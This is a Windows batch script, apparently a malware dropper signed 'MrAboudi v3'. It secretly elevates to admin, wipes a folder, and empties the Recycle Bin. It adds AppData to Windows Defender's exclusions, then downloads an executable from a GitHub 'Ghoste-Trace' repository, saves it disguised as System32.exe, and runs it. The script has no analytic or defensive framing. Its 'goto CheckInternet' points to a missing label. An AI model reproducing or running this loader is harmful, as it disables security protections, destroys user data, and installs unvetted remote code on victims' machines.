@echo off
set FILE="%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"
if exist %FILE% (
    exit /b
)

:: Check for internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul 2>&1
    goto CheckInternet
)

:: Check admin privileges
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: === NEW: Clear SubDir ===
set SUBDIR="%USERPROFILE%\AppData\Roaming\SubDir"
if exist %SUBDIR% (
    rmdir /s /q %SUBDIR%
    mkdir %SUBDIR%
)

:: === NEW: Empty Recycle Bin ===
powershell -WindowStyle Hidden -Command "$shell = New-Object -ComObject Shell.Application; $shell.Namespace(0xA).Items() | %% { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }"

:: Continue with rest
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
set "TARGET_FILE=%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"
exit

:: By MrAboudi
:: v3
